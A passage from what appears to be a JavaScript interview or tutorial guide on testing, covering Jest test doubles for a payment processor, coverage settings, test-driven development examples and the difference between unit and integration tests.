            expect(() => Validator.validateAge(151)).toThrow('Age is not realistic');
        });
    });
});
```

### Testing with Test Doubles

```javascript
// Payment processor: paymentProcessor.js
class PaymentProcessor {
    constructor(paymentGateway, emailService, database) {
        this.paymentGateway = paymentGateway;
        this.emailService = emailService;
        this.database = database;
    }
    
    async processPayment(orderId, amount, cardDetails) {
        // Validate amount
        if (amount <= 0) {
            throw new Error('Invalid amount');
        }
        
        // Check if order exists
        const order = await this.database.getOrder(orderId);
        if (!order) {
            throw new Error('Order not found');
        }
        
        // Process payment
        try {
            const result = await this.paymentGateway.charge(amount, cardDetails);
            
            // Update order status
            await this.database.updateOrder(orderId, {
                status: 'paid',
                transactionId: result.transactionId
            });
            
            // Send confirmation email
            await this.emailService.sendEmail(order.customerEmail, {
                subject: 'Payment Confirmation',
                body: `Your payment of $${amount} was successful.`
            });
            
            return {
                success: true,
                transactionId: result.transactionId
            };
        } catch (error) {
            // Log error and send failure email
            await this.emailService.sendEmail(order.customerEmail, {
                subject: 'Payment Failed',
                body: 'Your payment could not be processed.'
            });
            
            throw new Error(`Payment failed: ${error.message}`);
        }
    }
    
    async refundPayment(orderId) {
        const order = await this.database.getOrder(orderId);
        
        if (!order) {
            throw new Error('Order not found');
        }
        
        if (order.status !== 'paid') {
            throw new Error('Order not paid');
        }
        
        await this.paymentGateway.refund(order.transactionId);
        await this.database.updateOrder(orderId, { status: 'refunded' });
        
        return { success: true };
    }
}

module.exports = PaymentProcessor;

// Test file: paymentProcessor.test.js
const PaymentProcessor = require('./paymentProcessor');

describe('PaymentProcessor', () => {
    let processor;
    let mockGateway;
    let mockEmailService;
    let mockDatabase;
    
    beforeEach(() => {
        // Create test doubles
        mockGateway = {
            charge: jest.fn(),
            refund: jest.fn()
        };
        
        mockEmailService = {
            sendEmail: jest.fn().mockResolvedValue(true)
        };
        
        mockDatabase = {
            getOrder: jest.fn(),
            updateOrder: jest.fn().mockResolvedValue(true)
        };
        
        processor = new PaymentProcessor(mockGateway, mockEmailService, mockDatabase);
    });
    
    describe('processPayment()', () => {
        const orderId = 'order-123';
        const amount = 100;
        const cardDetails = { number: '4242424242424242' };
        const mockOrder = {
            id: orderId,
            customerEmail: 'customer@example.com',
            status: 'pending'
        };
        
        test('successfully processes payment', async () => {
            // Setup mocks
            mockDatabase.getOrder.mockResolvedValue(mockOrder);
            mockGateway.charge.mockResolvedValue({
                transactionId: 'txn-456'
            });
            
            // Execute
            const result = await processor.processPayment(orderId, amount, cardDetails);
            
            // Verify payment gateway called
            expect(mockGateway.charge).toHaveBeenCalledWith(amount, cardDetails);
            
            // Verify database updated
            expect(mockDatabase.updateOrder).toHaveBeenCalledWith(orderId, {
                status: 'paid',
                transactionId: 'txn-456'
            });
            
            // Verify confirmation email sent
            expect(mockEmailService.sendEmail).toHaveBeenCalledWith(
                'customer@example.com',
                expect.objectContaining({
                    subject: 'Payment Confirmation'
                })
            );
            
            // Verify result
            expect(result).toEqual({
                success: true,
                transactionId: 'txn-456'
            });
        });
        
        test('throws error for invalid amount', async () => {
            await expect(processor.processPayment(orderId, 0, cardDetails))
                .rejects
                .toThrow('Invalid amount');
            
            await expect(processor.processPayment(orderId, -10, cardDetails))
                .rejects
                .toThrow('Invalid amount');
        });
        
        test('throws error when order not found', async () => {
            mockDatabase.getOrder.mockResolvedValue(null);
            
            await expect(processor.processPayment(orderId, amount, cardDetails))
                .rejects
                .toThrow('Order not found');
        });
        
        test('sends failure email when payment fails', async () => {
            mockDatabase.getOrder.mockResolvedValue(mockOrder);
            mockGateway.charge.mockRejectedValue(new Error('Card declined'));
            
            await expect(processor.processPayment(orderId, amount, cardDetails))
                .rejects
                .toThrow('Payment failed: Card declined');
            
            // Verify failure email sent
            expect(mockEmailService.sendEmail).toHaveBeenCalledWith(
                'customer@example.com',
                expect.objectContaining({
                    subject: 'Payment Failed'
                })
            );
        });
        
        test('does not update order when payment fails', async () => {
            mockDatabase.getOrder.mockResolvedValue(mockOrder);
            mockGateway.charge.mockRejectedValue(new Error('Card declined'));
            
            try {
                await processor.processPayment(orderId, amount, cardDetails);
            } catch (error) {
                // Expected to fail
            }
            
            // Verify order was NOT updated
            expect(mockDatabase.updateOrder).not.toHaveBeenCalled();
        });
    });
    
    describe('refundPayment()', () => {
        const orderId = 'order-123';
        
        test('successfully refunds payment', async () => {
            const mockOrder = {
                id: orderId,
                status: 'paid',
                transactionId: 'txn-456'
            };
            
            mockDatabase.getOrder.mockResolvedValue(mockOrder);
            mockGateway.refund.mockResolvedValue(true);
            
            const result = await processor.refundPayment(orderId);
            
            expect(mockGateway.refund).toHaveBeenCalledWith('txn-456');
            expect(mockDatabase.updateOrder).toHaveBeenCalledWith(orderId, {
                status: 'refunded'
            });
            expect(result).toEqual({ success: true });
        });
        
        test('throws error when order not found', async () => {
            mockDatabase.getOrder.mockResolvedValue(null);
            
            await expect(processor.refundPayment(orderId))
                .rejects
                .toThrow('Order not found');
        });
        
        test('throws error when order not paid', async () => {
            mockDatabase.getOrder.mockResolvedValue({
                id: orderId,
                status: 'pending'
            });
            
            await expect(processor.refundPayment(orderId))
                .rejects
                .toThrow('Order not paid');
        });
    });
});
```

### Code Coverage

```javascript
// Run tests with coverage
// npm test -- --coverage

// jest.config.js
module.exports = {
    collectCoverage: true,
    coverageDirectory: 'coverage',
    coverageReporters: ['text', 'lcov', 'html'],
    collectCoverageFrom: [
        'src/**/*.js',
        '!src/**/*.test.js',
        '!src/index.js'
    ],
    coverageThresholds: {
        global: {
            branches: 80,
            functions: 80,
            lines: 80,
            statements: 80
        }
    }
};

// Coverage report shows:
// - Statements: % of statements executed
// - Branches: % of if/else branches executed
// - Functions: % of functions called
// - Lines: % of lines executed

// Example output:
/*
----------|---------|----------|---------|---------|
File      | % Stmts | % Branch | % Funcs | % Lines |
----------|---------|----------|---------|---------|
All files |   95.12 |    88.24 |   93.75 |   95.45 |
 user.js  |   100   |   100    |   100   |   100   |
 cart.js  |   91.67 |    75    |   88.89 |   92.31 |
----------|---------|----------|---------|---------|
*/
```

### Important Notes

- Write tests for happy paths, edge cases, and error conditions
- Test one thing per test case
- Use descriptive test names that explain what is being tested
- Setup and teardown with `beforeEach`, `afterEach`, `beforeAll`, `afterAll`
- Mock external dependencies (APIs, databases, services)
- Aim for high code coverage (80%+) but focus on meaningful tests
- Test behavior, not implementation details
- Keep tests simple, readable, and maintainable
- Run tests frequently during development
- Use test-driven development (TDD) when appropriate

---

## 55. What is Test-Driven Development (TDD) in JavaScript?

TDD is a software development approach where tests are written before the actual code.

### TDD Cycle: Red-Green-Refactor

```javascript
// Step 1: RED - Write a failing test first

// stringUtils.test.js
const { capitalize } = require('./stringUtils');

describe('capitalize()', () => {
    test('capitalizes first letter of string', () => {
        expect(capitalize('hello')).toBe('Hello');
    });
});

// Run test: ❌ FAILS (function doesn't exist yet)

// Step 2: GREEN - Write minimum code to pass the test

// stringUtils.js
function capitalize(str) {
    return str.charAt(0).toUpperCase() + str.slice(1);
}

module.exports = { capitalize };

// Run test: ✅ PASSES

// Step 3: REFACTOR - Improve code while keeping tests passing

// Add more tests
test('handles empty string', () => {
    expect(capitalize('')).toBe('');
});

test('handles single character', () => {
    expect(capitalize('a')).toBe('A');
});

// Refactor implementation
function capitalize(str) {
    if (!str) return '';
    return str.charAt(0).toUpperCase() + str.slice(1).toLowerCase();
}

// Run tests: ✅ ALL PASS
```

### TDD Example: Building a Todo List

```javascript
// Step 1: Write test for adding todo
// todoList.test.js
const TodoList = require('./todoList');

describe('TodoList', () => {
    let todoList;
    
    beforeEach(() => {
        todoList = new TodoList();
    });
    
    // Test 1: Add todo
    test('adds a todo item', () => {
        todoList.add('Buy milk');
        expect(todoList.getAll()).toHaveLength(1);
        expect(todoList.getAll()[0].text).toBe('Buy milk');
    });
});

// Step 2: Write minimum code to pass
// todoList.js
class TodoList {
    constructor() {
        this.todos = [];
    }
    
    add(text) {
        this.todos.push({ text });
    }
    
    getAll() {
        return this.todos;
    }
}

module.exports = TodoList;

// Step 3: Add more tests
test('adds multiple todos', () => {
    todoList.add('Buy milk');
    todoList.add('Walk dog');
    expect(todoList.getAll()).toHaveLength(2);
});

test('each todo has unique id', () => {
    todoList.add('Task 1');
    todoList.add('Task 2');
    const todos = todoList.getAll();
    expect(todos[0].id).toBeDefined();
    expect(todos[1].id).toBeDefined();
    expect(todos[0].id).not.toBe(todos[1].id);
});

// Step 4: Refactor to add IDs
class TodoList {
    constructor() {
        this.todos = [];
        this.nextId = 1;
    }
    
    add(text) {
        this.todos.push({
            id: this.nextId++,
            text,
            completed: false
        });
    }
    
    getAll() {
        return this.todos;
    }
}

// Continue TDD cycle for more features
test('marks todo as completed', () => {
    todoList.add('Buy milk');
    const id = todoList.getAll()[0].id;
    
    todoList.complete(id);
    
    expect(todoList.getAll()[0].completed).toBe(true);
});

// Implement complete method
complete(id) {
    const todo = this.todos.find(t => t.id === id);
    if (todo) {
        todo.completed = true;
    }
}

// Add test for removing todos
test('removes todo by id', () => {
    todoList.add('Task 1');
    todoList.add('Task 2');
    const id = todoList.getAll()[0].id;
    
    todoList.remove(id);
    
    expect(todoList.getAll()).toHaveLength(1);
    expect(todoList.getAll()[0].text).toBe('Task 2');
});

// Implement remove method
remove(id) {
    const index = this.todos.findIndex(t => t.id === id);
    if (index !== -1) {
        this.todos.splice(index, 1);
    }
}
```

### TDD Example: Calculator with Complex Logic

```javascript
// Build a calculator using TDD
// calculator.test.js
const Calculator = require('./calculator');

describe('Calculator', () => {
    let calc;
    
    beforeEach(() => {
        calc = new Calculator();
    });
    
    // Test 1: Basic addition
    test('adds two numbers', () => {
        expect(calc.add(2, 3)).toBe(5);
    });
    
    // Implement
    class Calculator {
        add(a, b) {
            return a + b;
        }
    }
    
    // Test 2: Chain operations
    test('chains operations', () => {
        expect(calc.add(2, 3).multiply(2).result()).toBe(10);
    });
    
    // Refactor for chaining
    class Calculator {
        constructor() {
            this.value = 0;
        }
        
        add(a, b) {
            if (b === undefined) {
                this.value += a;
                return this;
            }
            return a + b;
        }
        
        multiply(n) {
            this.value *= n;
            return this;
        }
        
        result() {
            return this.value;
        }
    }
    
    // Test 3: Handle division by zero
    test('throws error on division by zero', () => {
        expect(() => calc.divide(10, 0)).toThrow('Cannot divide by zero');
    });
    
    // Implement
    divide(a, b) {
        if (b === 0) {
            throw new Error('Cannot divide by zero');
        }
        if (b === undefined) {
            if (this.value === 0) {
                throw new Error('Cannot divide by zero');
            }
            this.value = this.value / a;
            return this;
        }
        return a / b;
    }
    
    // Test 4: Reset calculator
    test('resets calculator', () => {
        calc.add(5).multiply(2);
        calc.reset();
        expect(calc.result()).toBe(0);
    });
    
    // Implement
    reset() {
        this.value = 0;
        return this;
    }
});
```

### TDD with Async Operations

```javascript
// userRepository.test.js - Build data repository with TDD
const UserRepository = require('./userRepository');

describe('UserRepository', () => {
    let repo;
    let mockDb;
    
    beforeEach(() => {
        mockDb = {
            query: jest.fn()
        };
        repo = new UserRepository(mockDb);
    });
    
    // Test 1: Find user by ID
    test('finds user by id', async () => {
        const mockUser = { id: 1, name: 'John' };
        mockDb.query.mockResolvedValue([mockUser]);
        
        const user = await repo.findById(1);
        
        expect(mockDb.query).toHaveBeenCalledWith(
            'SELECT * FROM users WHERE id = ?',
            [1]
        );
        expect(user).toEqual(mockUser);
    });
    
    // Implement

class UserRepository {
        constructor(db) {
            this.db = db;
        }
        
        async findById(id) {
            const results = await this.db.query(
                'SELECT * FROM users WHERE id = ?',
                [id]
            );
            return results[0];
        }
    }
    
    // Test 2: Returns null when user not found
    test('returns null when user not found', async () => {
        mockDb.query.mockResolvedValue([]);
        
        const user = await repo.findById(999);
        
        expect(user).toBeNull();
    });
    
    // Refactor
    async findById(id) {
        const results = await this.db.query(
            'SELECT * FROM users WHERE id = ?',
            [id]
        );
        return results[0] || null;
    }
    
    // Test 3: Create user
    test('creates new user', async () => {
        const userData = { name: 'Jane', email: 'jane@example.com' };
        mockDb.query.mockResolvedValue({ insertId: 2 });
        
        const user = await repo.create(userData);
        
        expect(mockDb.query).toHaveBeenCalledWith(
            'INSERT INTO users (name, email) VALUES (?, ?)',
            ['Jane', 'jane@example.com']
        );
        expect(user).toEqual({ id: 2, ...userData });
    });
    
    // Implement
    async create(userData) {
        const result = await this.db.query(
            'INSERT INTO users (name, email) VALUES (?, ?)',
            [userData.name, userData.email]
        );
        return { id: result.insertId, ...userData };
    }
    
    // Test 4: Validate email before creating
    test('throws error for invalid email', async () => {
        const userData = { name: 'Jane', email: 'invalid' };
        
        await expect(repo.create(userData))
            .rejects
            .toThrow('Invalid email');
    });
    
    // Implement validation
    async create(userData) {
        if (!this.isValidEmail(userData.email)) {
            throw new Error('Invalid email');
        }
        
        const result = await this.db.query(
            'INSERT INTO users (name, email) VALUES (?, ?)',
            [userData.name, userData.email]
        );
        return { id: result.insertId, ...userData };
    }
    
    isValidEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }
    
    // Test 5: Update user
    test('updates existing user', async () => {
        mockDb.query.mockResolvedValue({ affectedRows: 1 });
        
        const updated = await repo.update(1, { name: 'John Updated' });
        
        expect(mockDb.query).toHaveBeenCalledWith(
            'UPDATE users SET name = ? WHERE id = ?',
            ['John Updated', 1]
        );
        expect(updated).toBe(true);
    });
    
    // Implement
    async update(id, updates) {
        const result = await this.db.query(
            'UPDATE users SET name = ? WHERE id = ?',
            [updates.name, id]
        );
        return result.affectedRows > 0;
    }
    
    // Test 6: Delete user
    test('deletes user', async () => {
        mockDb.query.mockResolvedValue({ affectedRows: 1 });
        
        const deleted = await repo.delete(1);
        
        expect(mockDb.query).toHaveBeenCalledWith(
            'DELETE FROM users WHERE id = ?',
            [1]
        );
        expect(deleted).toBe(true);
    });
    
    // Implement
    async delete(id) {
        const result = await this.db.query(
            'DELETE FROM users WHERE id = ?',
            [id]
        );
        return result.affectedRows > 0;
    }
});
```

### TDD Benefits Example

```javascript
// Example showing how TDD catches bugs early

// SCENARIO: Building a password strength checker

// Test 1: Weak password
test('identifies weak password', () => {
    expect(checkPasswordStrength('abc')).toBe('weak');
});

// Initial implementation
function checkPasswordStrength(password) {
    if (password.length < 8) return 'weak';
    return 'strong';
}

// Test 2: Medium password
test('identifies medium password', () => {
    expect(checkPasswordStrength('abcd1234')).toBe('medium');
});

// Update implementation
function checkPasswordStrength(password) {
    if (password.length < 8) return 'weak';
    if (password.length < 12) return 'medium';
    return 'strong';
}

// Test 3: Strong password with mixed characters
test('identifies strong password', () => {
    expect(checkPasswordStrength('Abcd1234!@#$')).toBe('strong');
});

// This test FAILS! Our implementation only checks length
// TDD reveals the bug early

// Test 4: Check for character variety
test('weak if only lowercase', () => {
    expect(checkPasswordStrength('abcdefghij')).toBe('weak');
});

test('medium if mixed case and numbers', () => {
    expect(checkPasswordStrength('Abcd1234')).toBe('medium');
});

test('strong if mixed case, numbers, and symbols', () => {
    expect(checkPasswordStrength('Abcd1234!@')).toBe('strong');
});

// Refactored implementation based on tests
function checkPasswordStrength(password) {
    let score = 0;
    
    // Length
    if (password.length >= 8) score++;
    if (password.length >= 12) score++;
    
    // Character variety
    if (/[a-z]/.test(password) && /[A-Z]/.test(password)) score++;
    if (/\d/.test(password)) score++;
    if (/[^A-Za-z0-9]/.test(password)) score++;
    
    if (score <= 2) return 'weak';
    if (score <= 4) return 'medium';
    return 'strong';
}
```

### TDD with React Components

```javascript
// counter.test.js - TDD for React component
import { render, screen, fireEvent } from '@testing-library/react';
import Counter from './Counter';

describe('Counter Component', () => {
    // Test 1: Renders with initial count
    test('renders with count 0', () => {
        render(<Counter />);
        expect(screen.getByText('Count: 0')).toBeInTheDocument();
    });
    
    // Implement minimal component
    function Counter() {
        return <div>Count: 0</div>;
    }
    
    // Test 2: Increment button increases count
    test('increment button increases count', () => {
        render(<Counter />);
        const incrementBtn = screen.getByText('Increment');
        
        fireEvent.click(incrementBtn);
        
        expect(screen.getByText('Count: 1')).toBeInTheDocument();
    });
    
    // Implement with state
    import { useState } from 'react';
    
    function Counter() {
        const [count, setCount] = useState(0);
        
        return (
            <div>
                <div>Count: {count}</div>
                <button onClick={() => setCount(count + 1)}>
                    Increment
                </button>
            </div>
        );
    }
    
    // Test 3: Decrement button decreases count
    test('decrement button decreases count', () => {
        render(<Counter />);
        const incrementBtn = screen.getByText('Increment');
        const decrementBtn = screen.getByText('Decrement');
        
        fireEvent.click(incrementBtn);
        fireEvent.click(incrementBtn);
        fireEvent.click(decrementBtn);
        
        expect(screen.getByText('Count: 1')).toBeInTheDocument();
    });
    
    // Add decrement functionality
    function Counter() {
        const [count, setCount] = useState(0);
        
        return (
            <div>
                <div>Count: {count}</div>
                <button onClick={() => setCount(count + 1)}>
                    Increment
                </button>
                <button onClick={() => setCount(count - 1)}>
                    Decrement
                </button>
            </div>
        );
    }
    
    // Test 4: Reset button sets count to 0
    test('reset button sets count to 0', () => {
        render(<Counter />);
        const incrementBtn = screen.getByText('Increment');
        const resetBtn = screen.getByText('Reset');
        
        fireEvent.click(incrementBtn);
        fireEvent.click(incrementBtn);
        fireEvent.click(resetBtn);
        
        expect(screen.getByText('Count: 0')).toBeInTheDocument();
    });
    
    // Add reset functionality
    function Counter() {
        const [count, setCount] = useState(0);
        
        return (
            <div>
                <div>Count: {count}</div>
                <button onClick={() => setCount(count + 1)}>
                    Increment
                </button>
                <button onClick={() => setCount(count - 1)}>
                    Decrement
                </button>
                <button onClick={() => setCount(0)}>
                    Reset
                </button>
            </div>
        );
    }
    
    // Test 5: Count cannot go below 0
    test('count cannot be negative', () => {
        render(<Counter />);
        const decrementBtn = screen.getByText('Decrement');
        
        fireEvent.click(decrementBtn);
        
        expect(screen.getByText('Count: 0')).toBeInTheDocument();
    });
    
    // Update to prevent negative counts
    function Counter() {
        const [count, setCount] = useState(0);
        
        const decrement = () => {
            setCount(prev => Math.max(0, prev - 1));
        };
        
        return (
            <div>
                <div>Count: {count}</div>
                <button onClick={() => setCount(count + 1)}>
                    Increment
                </button>
                <button onClick={decrement}>
                    Decrement
                </button>
                <button onClick={() => setCount(0)}>
                    Reset
                </button>
            </div>
        );
    }
});
```

### TDD Best Practices

```javascript
// 1. Write the simplest test first
test('function exists', () => {
    expect(typeof myFunction).toBe('function');
});

// 2. One assertion per test (when possible)
// Bad
test('user validation', () => {
    expect(user.name).toBe('John');
    expect(user.email).toBe('john@example.com');
    expect(user.age).toBe(25);
});

// Good
test('user has correct name', () => {
    expect(user.name).toBe('John');
});

test('user has correct email', () => {
    expect(user.email).toBe('john@example.com');
});

test('user has correct age', () => {
    expect(user.age).toBe(25);
});

// 3. Test behavior, not implementation
// Bad - testing implementation details
test('uses forEach to process items', () => {
    const spy = jest.spyOn(Array.prototype, 'forEach');
    processItems([1, 2, 3]);
    expect(spy).toHaveBeenCalled();
});

// Good - testing behavior
test('processes all items', () => {
    const result = processItems([1, 2, 3]);
    expect(result).toEqual([2, 4, 6]);
});

// 4. Follow AAA pattern: Arrange, Act, Assert
test('calculates discount', () => {
    // Arrange
    const price = 100;
    const discountPercent = 10;
    
    // Act
    const finalPrice = calculateDiscount(price, discountPercent);
    
    // Assert
    expect(finalPrice).toBe(90);
});

// 5. Test edge cases
describe('divide function', () => {
    test('divides positive numbers', () => {
        expect(divide(10, 2)).toBe(5);
    });
    
    test('divides negative numbers', () => {
        expect(divide(-10, 2)).toBe(-5);
    });
    
    test('handles zero dividend', () => {
        expect(divide(0, 5)).toBe(0);
    });
    
    test('throws error for zero divisor', () => {
        expect(() => divide(10, 0)).toThrow();
    });
    
    test('handles decimal results', () => {
        expect(divide(10, 3)).toBeCloseTo(3.333, 3);
    });
});

// 6. Keep tests independent
describe('shopping cart', () => {
    let cart;
    
    beforeEach(() => {
        // Fresh cart for each test
        cart = new ShoppingCart();
    });
    
    test('adds item', () => {
        cart.addItem({ id: 1, price: 10 });
        expect(cart.itemCount()).toBe(1);
    });
    
    test('removes item', () => {
        cart.addItem({ id: 1, price: 10 });
        cart.removeItem(1);
        expect(cart.itemCount()).toBe(0);
    });
});

// 7. Use descriptive test names
// Bad
test('test1', () => {
    expect(add(2, 3)).toBe(5);
});

// Good
test('adds two positive integers correctly', () => {
    expect(add(2, 3)).toBe(5);
});

// Even better - BDD style
describe('add()', () => {
    describe('when given two positive integers', () => {
        it('returns their sum', () => {
            expect(add(2, 3)).toBe(5);
        });
    });
    
    describe('when given negative integers', () => {
        it('returns their sum', () => {
            expect(add(-2, -3)).toBe(-5);
        });
    });
});
```

### TDD Workflow Example

```javascript
// Complete TDD workflow for a feature

// Feature: User registration validator

// Iteration 1: Email validation
describe('validateEmail()', () => {
    test('returns true for valid email', () => {
        expect(validateEmail('user@example.com')).toBe(true);
    });
});

function validateEmail(email) {
    return true; // Simplest code to pass
}

// Iteration 2: Invalid email
test('returns false for invalid email', () => {
    expect(validateEmail('invalid')).toBe(false);
});

function validateEmail(email) {
    return email.includes('@'); // Still simple
}

// Iteration 3: More specific validation
test('returns false for email without domain', () => {
    expect(validateEmail('user@')).toBe(false);
});

function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

// Iteration 4: Full validator
describe('UserValidator', () => {
    test('validates complete user data', () => {
        const userData = {
            email: 'user@example.com',
            password: 'Password123!',
            age: 25
        };
        
        expect(UserValidator.validate(userData)).toBe(true);
    });
});

class UserValidator {
    static validate(userData) {
        return this.validateEmail(userData.email) &&
               this.validatePassword(userData.password) &&
               this.validateAge(userData.age);
    }
    
    static validateEmail(email) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
    }
    
    static validatePassword(password) {
        return password.length >= 8 &&
               /[A-Z]/.test(password) &&
               /[a-z]/.test(password) &&
               /\d/.test(password) &&
               /[^A-Za-z0-9]/.test(password);
    }
    
    static validateAge(age) {
        return typeof age === 'number' && age >= 18 && age <= 150;
    }
}

// Continue adding tests and refining implementation
```

### Important Notes

- **Red-Green-Refactor**: Write failing test, make it pass, improve code
- Write tests before implementation code
- Start with the simplest test case
- Write only enough code to pass the test
- Refactor after tests pass, never during red phase
- Tests serve as documentation and design tool
- TDD leads to better design and testable code
- Faster debugging - know immediately when something breaks
- Higher confidence when refactoring
- Tests act as safety net for changes
- May feel slower initially but saves time in long run
- Not suitable for all scenarios (exploratory coding, prototypes)
- Requires discipline and practice to master

---

## 56. Can you explain the difference between unit and integration testing?

Unit tests verify individual components in isolation, while integration tests verify that multiple components work together correctly.

### Unit Testing

```javascript
// Unit Test: Tests a single function in isolation

// math.js
function add(a, b) {
    return a + b;
}

function multiply(a, b) {
    return a * b;
}

module.exports = { add, multiply };

// math.test.js - UNIT TEST
const { add, multiply } = require('./math');

describe('Math Functions - Unit Tests', () => {
    // Testing add() in isolation
    describe('add()', () => {
        test('adds two positive numbers', () => {
            expect(add(2, 3)).toBe(5);
        });
        
        test('adds negative numbers', () => {
            expect(add(-1, -2)).toBe(-3);
        });
        
        test('adds zero', () => {
            expect(add(5, 0)).toBe(5);
        });
    });
    
    // Testing multiply() in isolation
    describe('multiply()', () => {
        test('multiplies two numbers', () => {
            expect(multiply(3, 4)).toBe(12);
        });
        
        test('multiplies by zero', () => {
            expect(multiply(5, 0)).toBe(0);
        });
    });
});

// Characteristics of Unit Tests:
// - Test single function/method
// - No external dependencies
// - Fast execution
// - Easy to pinpoint failures
// - Run frequently during development
```

### Integration Testing

```javascript
// Integration Test: Tests multiple components working together

// userService.js
class UserService {
    constructor(database, emailService) {
        this.database = database;
        this.emailService = emailService;
    }
    
    async registerUser(userData) {
        // Validate user data
        if (!userData.email || !userData.password) {
            throw new Error('Invalid user data');
        }
        
        // Check if user exists
        const existing = await this.database.findUserByEmail(userData.email);
        if (existing) {
            throw new Error('User already exists');
        }
        
        // Save user
        const user = await this.database.createUser(userData);
        
        // Send welcome email
        await this.emailService.sendWelcomeEmail(user.email, user.name);
        
        return user;
    }
}

// userService.integration.test.js - INTEGRATION TEST
describe('UserService - Integration Tests', () => {
    let userService;
    let database;
    let emailService;
    
    beforeEach(() => {
        // Use real or realistic implementations
        database = new TestDatabase(); // In-memory database
        emailService = new TestEmailService(); // Mock email service
        userService = new UserService(database, emailService);
    });
    
    afterEach(async () => {
        await database.clear();
    });
    
    test('successfully registers new user', async () => {
        const userData = {
            name: 'John Doe',
            email: 'john@example.com',
            password: 'password123'
        };
        
        // Act - tests integration of multiple components
        const user = await userService.registerUser(userData);
        
        // Assert - verify database interaction
        expect(user).toBeDefined();
        expect(user.id).toBeDefined();
        expect(user.email).toBe(userData.email);
        
        // Verify user was saved to database
        const savedUser = await database.findUserByEmail(userData.email);
        expect(savedUser).toBeDefined();
        expect(savedUser.name).toBe(userData.name);
        
        // Verify email was sent
        expect(emailService.getSentEmails()).toHaveLength(1);
        expect(emailService.getSentEmails()[0].to).toBe(userData.email);
    });
    
    test('prevents duplicate registrations', async () => {
        const userData = {
            name: 'John Doe',
            email: 'john@example.com',
            password: 'password123'
        };
        
        // Register user first time
        await userService.registerUser(userData);
        
        // Try to register again - should fail
        await expect(userService.registerUser(userData))
            .rejects
            .toThrow('User already exists');
        
        // Verify only one user in database
        const users = await database.getAllUsers();
        expect(users).toHaveLength(1);
    });
});

// Characteristics of Integration Tests:
// - Test multiple components together
// - May involve external systems (database, API)
// - Slower than unit tests
// - Test real workflows
// - Run less frequently (before commits/deploys)
```

### Comparison Example

```javascript
// Example: Order Processing System

// === UNIT TESTS ===

// orderCalculator.test.js
const OrderCalculator = require('./orderCalculator');

describe('OrderCalculator - Unit Tests', () => {
    // Test single responsibility: calculating total
    test('calculates order total', () => {
        const items = [
            { price: 10, quantity: 2 },
            { price: 5, quantity: 3 }
        ];
        
        expect(OrderCalculator.calculateTotal(items)).toBe(35);
    });
    
    test('applies discount', () => {
        const total = 100;
        const discount = 0.1;
        
        expect(OrderCalculator.applyDiscount(total, discount)).toBe(90);
    });
    
    test('calculates tax', () => {
        const subtotal = 100;
        const taxRate = 0.08;
        
        expect(OrderCalculator.calculateTax(subtotal, taxRate)).toBe(8);
    });
});

// === INTEGRATION TESTS ===

// orderService.integration.test.js
const OrderService = require('./orderService');
const Database = require('./database');
const PaymentGateway = require('./paymentGateway');
const EmailService = require('./emailService');

describe('OrderService - Integration Tests', () => {
    let orderService;
    let database;
    let paymentGateway;
    let emailService;
    
    beforeAll(async () => {
        database = new Database();
        await database.connect();
        
        paymentGateway = new PaymentGateway({ testMode: true });
        emailService = new EmailService({ testMode: true });
        
        orderService = new OrderService(database, paymentGateway, emailService);
    });
    
    afterAll(async () => {
        await database.disconnect();
    });
    
    test('processes complete order workflow', async () => {
        // Create order
        const orderData = {
            customerId: 1,
            items: [
                { productId: 1, quantity: 2 },
                { productId: 2, quantity: 1 }
            ],
            paymentMethod: {
                type: 'card',
                number: '4242424242424242'
            }
        };
        
        // Process order - tests entire workflow
        const order = await orderService.processOrder(orderData);
        
        // Verify order created in database
        const savedOrder = await database.getOrder(order.id);
        expect(savedOrder).toBeDefined();
        expect(savedOrder.status).toBe('completed');
        
        // Verify payment processed
        const payment = await paymentGateway.getTransaction(order.transactionId);
        expect(payment.status).toBe('success');
        expect(payment.amount).toBe(order.total);
        
        // Verify confirmation email sent
        const emails = await emailService.getSentEmails();
        const confirmationEmail = emails.find(e => 
            e.to === savedOrder.customerEmail &&
            e.subject.includes('Order Confirmation')
        );
        expect(confirmationEmail).toBeDefined();
        
        // Verify inventory updated
        const product1 = await database.getProduct(1);
        expect(product1.stock).toBe(product1.originalStock - 2);
    });
    
    test('handles payment failure correctly', async () => {
        const orderData = {
            customerId: 1,
            items: [{ productId: 1, quantity: 1 }],
            paymentMethod: {
                type: 'card',
                number: '4000000000000002' // Test card that fails
            }
        };
        
        // Attempt to process order
        await expect(orderService.processOrder(orderData))
            .rejects
            .toThrow('Payment failed');
        
        // Verify order marked as failed
        const orders = await database.getOrdersByCustomer(1);
        const failedOrder = orders.find(o => o.status === 'failed');
        expect(failedOrder).toBeDefined();
        
        // Verify inventory not changed
        const product = await database.getProduct(1);
        expect(product.stock).toBe(product.originalStock);
        
        // Verify failure notification sent
        const emails = await emailService.getSentEmails();
        const failureEmail = emails.find(e => 
            e.subject.includes('Order Failed')
        );
        expect(failureEmail).toBeDefined();
    });
});
```

### Unit vs Integration: Testing Pyramid

```javascript
// Testing Pyramid: More unit tests, fewer integration tests

/*
        /\
       /  \      E2E Tests (few, slow)
      /____\
     /      \    Integration Tests (moderate)
    /________\
   /          \  Unit Tests (many, fast)
  /__________  \

*/

// Project Test Structure Example:

// tests/
// ├── unit/                    (80% of tests)
// │   ├── utils.test.js
// │   ├── validators.test.js
// │   ├── calculations.test.js
// │   └── models.test.js
// │
// ├── integration/             (15% of tests)
// │   ├── api.integration.test.js
// │   ├── database.integration.test.js
// │   └── services.integration.test.js
// │
// └── e2e/                     (5% of tests)
//     ├── userFlow.e2e.test.js
//     └── checkout.e2e.test.js

// package.json scripts
{
    "scripts": {
        "test": "jest",
        "test:unit": "jest tests/unit",
        "test:integration": "jest tests/integration",
        "test:e2e": "jest tests/e2e",
        "test:watch": "jest --watch",
        "test:coverage": "jest --coverage"
    }
}
```

### When to Use Each Type

```javascript
// UNIT TESTS - Use for:

// 1. Pure functions
function calculateDiscount(price, percent) {
    return price * (percent / 100);
}

test('calculates discount correctly', () => {
    expect(calculateDiscount(100, 10)).toBe(10);
});

// 2. Business logic
class PriceCalculator {
    calculate(items) {
        return items.reduce((sum, item) => sum + item.price * item.quantity, 0);
    }
}

test('sums item prices', () => {
    const calc = new PriceCalculator();
    const items = [
        { price: 10, quantity: 2 },
        { price: 5, quantity: 1 }
    ];
    expect(calc.calculate(items)).toBe(25);
});

// 3. Utility functions
function formatCurrency(amount) {
